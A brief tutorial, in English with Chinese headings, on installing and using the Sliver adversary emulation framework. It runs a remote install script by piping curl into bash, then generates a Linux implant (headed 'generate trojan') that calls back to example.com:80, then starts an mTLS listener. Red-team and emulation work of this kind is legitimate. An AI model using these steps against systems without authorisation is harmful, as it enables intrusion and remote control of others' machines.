Adversary Emulation Framework.

## 1. Install

安装

```
┌──(sec@debian)-[~]
└─$ curl -fsSL https://github.com/jadensalas469466/scripts/raw/main/sliver_install.sh | bash
```

## 2. Usage

生成木马

```
[server] sliver > generate -o linux -m example.com:80
```

监听 80 端口

```
[server] sliver > mtls -l 80
```

---

Refrences

- [sliver](https://github.com/BishopFox/sliver)

